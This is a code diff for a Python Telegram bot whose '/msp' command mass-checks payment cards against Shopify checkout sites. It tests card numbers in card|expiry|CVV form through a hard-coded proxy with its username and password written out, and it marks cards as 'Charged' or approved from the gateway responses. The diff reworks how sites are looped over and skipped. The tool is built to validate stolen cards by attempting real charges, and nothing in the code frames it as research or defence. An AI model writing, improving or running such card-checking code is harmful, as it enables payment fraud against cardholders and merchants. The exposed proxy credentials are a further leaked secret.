@@ -4757,24 +4757,14 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
     try:
         resp = await session.get(url, timeout=120)
         data = resp.json()
-        # Skip if required fields missing
+
+        # Skip conditions
         if not data.get("client_token") or not data.get("price") or not data.get("product_id"):
             return "SKIP", "false", "0", "N/A"
+
         return data.get("Response", "Unknown"), data.get("Status", "false"), data.get("Price", "0"), data.get("Gateway", "Shopify")
     except Exception as e:
         return f"Error: {str(e)}", "false", "0", "N/A"
-
-
-# --- Worker for a single card ---
-async def check_card_worker(card, base_url, sites, sem, session):
-    async with sem:
-        proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
-        for site in sites:
-            resp, status, price, gateway = await check_card(session, base_url, site, card, proxy)
-            if resp != "SKIP":
-                return resp, status, price, gateway
-        # If all sites skipped
-        return "No valid response", "false", "0", "N/A"
 
 # --- Mass check runner ---
 async def run_msp(update: Update, cards, base_url, sites, msg):
@@ -4782,7 +4772,6 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     site_price = None
     gateway_used = "Self Shopify"
     results = []
-    sem = asyncio.Semaphore(5)
     lock = asyncio.Lock()
 
     PRIORITY = {
@@ -4802,74 +4791,66 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
         "UNKNOWN": 0,
     }
 
-    async with httpx.AsyncClient() as session:
-        proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"  # Updated proxy
+    proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+    async with httpx.AsyncClient(timeout=120) as session:
+        for site in sites:
+            skip_remaining = False
 
-        async def check_one(card, site):
-            card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
-            card_str = card_str.replace(" ", "")
-            resp, status, price, gateway = await check_card(session, base_url, site, card_str, proxy)
-            resp_str = str(resp).strip()
-            resp_upper = resp_str.upper().replace(" ", "_")
-
-            nonlocal site_price, gateway_used
-            if site_price is None:
-                try:
-                    site_price = float(price)
-                except:
-                    site_price = 0.0
-            if gateway and gateway != "N/A":
-                gateway_used = gateway
-
-            # Determine score
-            score = 0
-            for key, val in PRIORITY.items():
-                if key in resp_upper:
-                    score = val
+            for card in cards:
+                if skip_remaining:
                     break
-            return resp_str, score
 
-        async def worker(card):
-            nonlocal approved, declined, errors, checked, results
-            async with sem:
-                tasks = [check_one(card, site) for site in sites]
-                responses = await asyncio.gather(*tasks, return_exceptions=True)
+                card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
+                card_str = card_str.replace(" ", "")
 
-                best_resp, best_score = "Unknown", 0
-                for r in responses:
-                    if isinstance(r, Exception):
-                        resp_str, score = f"Error: {r}", 0
-                    else:
-                        resp_str, score = r
-                    if score > best_score:
-                        best_resp, best_score = resp_str, score
+                resp, status, price, gateway = await check_card(session, base_url, site, card_str, proxy)
+                resp_upper = str(resp).upper().replace(" ", "_")
 
-                # Skip site if "No valid response" is returned
-                if "No valid response" in best_resp:
+                # Skip this site if these conditions are met
+                if resp == "SKIP":
+                    skip_remaining = True
                     errors += 1
                     status_icon = "⚠️"
-                    display_resp = "No valid response"
-                elif best_score >= 4:
-                    approved += 1
-                    status_icon = "✅"
-                    display_resp = f"{escape(best_resp)} ▸ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
-                elif best_score == 3:
-                    approved += 1
-                    status_icon = "✅"
-                    display_resp = f"{escape(best_resp)} 🔒"
-                elif best_score == 2:
-                    declined += 1
-                    status_icon = "❌"
-                    display_resp = escape(best_resp)
+                    display_resp = "Skip condition met, moving to next site"
                 else:
-                    errors += 1
-                    status_icon = "⚠️"
-                    display_resp = escape(best_resp)
+                    # Determine score
+                    score = 0
+                    for key, val in PRIORITY.items():
+                        if key in resp_upper:
+                            score = val
+                            break
+
+                    if score >= 4:
+                        approved += 1
+                        status_icon = "✅"
+                        display_resp = f"{escape(resp)} ▸ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+                    elif score == 3:
+                        approved += 1
+                        status_icon = "✅"
+                        display_resp = f"{escape(resp)} 🔒"
+                    elif score == 2:
+                        declined += 1
+                        status_icon = "❌"
+                        display_resp = escape(resp)
+                    else:
+                        errors += 1
+                        status_icon = "⚠️"
+                        display_resp = escape(resp)
 
                 checked += 1
+
+                if site_price is None:
+                    try:
+                        site_price = float(price)
+                    except:
+                        site_price = 0.0
+                if gateway and gateway != "N/A":
+                    gateway_used = gateway
+
                 result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>"
                 results.append(result_line)
 
+                # Update progress in Telegram
                 async with lock:
                     summary_text = (
                         "<pre><code>"
@@ -4891,11 +4872,8 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                         await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)
                     except:
                         pass
-                    await asyncio.sleep(0.1)
 
-        for card in cards:
-            await worker(card)
-
+                await asyncio.sleep(0.1)
 # --- /msp command ---
 async def msp(update: Update, context: "ContextTypes.DEFAULT_TYPE"):
     user_id = update.effective_user.id
